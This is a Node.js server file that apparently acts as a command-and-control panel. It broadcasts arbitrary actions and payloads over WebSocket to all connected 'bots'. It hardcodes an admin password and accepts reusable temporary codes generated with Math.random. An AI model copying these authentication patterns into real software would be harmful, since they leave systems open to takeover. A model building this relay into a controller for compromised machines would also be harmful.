const express = require('express');
const http = require('http');
const WebSocket = require('ws');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(express.json());
app.use(express.static('public'));

const ADMIN_PASSWORD = "67sucksandpotatoesarebetterthanhumans"; 
const tempCodes = new Map();

app.post('/api/create-temp-code', (req, res) => {
    const { password } = req.body;
    if (password !== ADMIN_PASSWORD) return res.status(401).json({ error: "Unauthorized" });

    const code = Math.floor(100000 + Math.random() * 900000).toString();
    const expiresAt = Date.now() + (10 * 60 * 1000); // 10 minutes
    tempCodes.set(code, expiresAt);

    res.json({ code, expiresAt });
});

function verifyAuth(req, res, next) {
    const { auth } = req.body;
    if (!auth) return res.status(401).json({ error: "Missing authentication" });

    if (auth === ADMIN_PASSWORD) return next();

    if (tempCodes.has(auth)) {
        const expiresAt = tempCodes.get(auth);
        if (Date.now() > expiresAt) {
            tempCodes.delete(auth);
            return res.status(403).json({ error: "Temporary code expired" });
        }
        // do not delete here if you want to reuse the temp code until it expires!
        return next();
    }

    return res.status(401).json({ error: "Invalid password or temp code" });
}

const botSockets = new Set();

wss.on('connection', (ws) => {
    ws.isAlive = true;
    botSockets.add(ws);
    console.log(`[+] Bot connected. Total connected: ${botSockets.size}`);

    ws.on('pong', () => {
        ws.isAlive = true;
    });

    ws.on('close', () => {
        botSockets.delete(ws);
        console.log(`[-] Bot disconnected. Total connected: ${botSockets.size}`);
    });

    ws.on('error', () => {
        botSockets.delete(ws);
    });
});

// heartbeat ping every 30s to bypass render's 55s idle timeout
const interval = setInterval(() => {
    wss.clients.forEach((ws) => {
        if (ws.isAlive === false) {
            botSockets.delete(ws);
            return ws.terminate();
        }
        ws.isAlive = false;
        ws.ping();
    });
}, 30000);

wss.on('close', () => {
    clearInterval(interval);
});

app.post('/api/command', verifyAuth, (req, res) => {
    const { action, payload } = req.body;
    const message = JSON.stringify({ action, payload });
    let delivered = 0;

    botSockets.forEach((client) => {
        if (client.readyState === WebSocket.OPEN) {
            try {
                client.send(message);
                delivered++;
            } catch (e) {
                botSockets.delete(client);
            }
        } else {
            botSockets.delete(client);
        }
    });

    res.json({ success: true, deliveredBots: delivered });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Control panel active on port ${PORT}`));
